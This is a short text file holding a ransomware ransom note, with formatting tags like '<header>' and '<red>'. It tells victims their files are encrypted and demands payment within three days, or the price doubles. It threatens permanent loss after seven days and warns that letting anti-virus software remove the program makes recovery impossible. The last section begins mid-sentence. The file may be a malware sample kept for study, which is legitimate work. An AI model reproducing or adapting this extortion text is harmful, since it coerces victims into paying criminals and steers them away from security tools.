<header>What Happened to My Computer?
Your important files are encrypted.
Many of your documents, photos, videos, databases and other files are no longer
acessible because they have been encrypted. Maybe you are busy looking for a way to
recover your files, but do not waste your time. Nobody can recover your files without
our decryption service.

<header>How Do I Pay?
Sure. We guarantee that you can recover your all your files safely and easily. But you have
not so enough time.
You can decrypt some of your files for free. Try now by clicking <Decrypt>.
But if you want to decrypt all your files, you need to pay.
You only have 3 days to submit the payment. After that the price will be doubled.
Also, if you don't in 7 days, you won't be able to recover your files forever.
We will have free events for users who are so poor that they couldn't pay in 6 months.

<red>for a while, until you pay and the payment gets processed. If your anti-virus gets
<red>updated and removes this software automatically, it will not be able to recover your
<red>files even if you pay!
